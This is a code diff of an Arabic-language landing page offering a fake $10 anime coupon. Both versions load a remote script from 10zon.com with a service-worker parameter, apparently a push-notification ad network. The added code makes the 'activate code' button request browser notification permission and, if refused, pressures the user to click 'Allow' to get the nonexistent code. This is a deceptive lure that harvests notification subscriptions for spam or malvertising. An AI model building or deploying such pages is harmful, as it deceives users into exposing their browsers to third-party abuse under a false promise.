@@ -3,27 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عرض خاص - كوبون خصم أنمي</title>
-    <script>
-        (function(s,u,z,p){
-            s.src=u+'?z='+z+'&sw='+p;
-            s.onload=function(){window.mwrtz=z};
-            document.head.appendChild(s);
-        })(document.createElement('script'),'//10zon.com/e71/5bafb/mw.min.js',10716426,'/sw.js');
-    </script>
-    <style>
-        body { font-family: Arial, sans-serif; background-color: #1a1a1a; color: white; text-align: center; padding: 50px; }
-        .container { background-color: #262626; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(255,0,0,0.5); display: inline-block; }
-        h1 { color: #ff4d4d; }
-        .btn { background-color: #ff4d4d; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 20px; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; }
-        .btn:hover { background-color: #cc0000; }
-    </style>
+    <title>عرض خاص - كوبون أنمي</title>
+    <script src='//10zon.com/e71/5bafb/mw.min.js?z=10716426'+'&sw=/sw.js'></script>
 </head>
-<body>
-    <div class="container">
+<body style="background-color: #1a1a1a; color: white; text-align: center; padding: 50px; font-family: Arial;">
+
+    <div style="background-color: #262626; padding: 30px; border-radius: 15px; display: inline-block; border: 2px solid #ff4d4d;">
         <h1>مبروك! أنت مؤهل للحصول على كوبون بقيمة 10$</h1>
-        <p>اضغط على الزر أسفله لتفعيل الكود الخاص بك وشحنه في حسابك</p>
-        <a href="#" class="btn">تفعيل الكود الآن</a>
+        <p>اضغط على الزر أسفله لتفعيل الكود الخاص بك</p>
+        
+        <button onclick="askPermission()" style="background-color: #ff4d4d; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 20px; cursor: pointer;">تفعيل الكود الآن</button>
     </div>
+
+    <script>
+        function askPermission() {
+            // كود كيطلب الإذن يدوياً
+            Notification.requestPermission().then(function(permission) {
+                if (permission === 'granted') {
+                    alert('تم تفعيل الاشتراك! انتظر وصول الكود في الإشعارات.');
+                } else {
+                    alert('يرجى الضغط على "سماح" أو "Allow" لتتمكن من استلام الكود.');
+                }
+            });
+        }
+    </script>
+
 </body>
 </html>
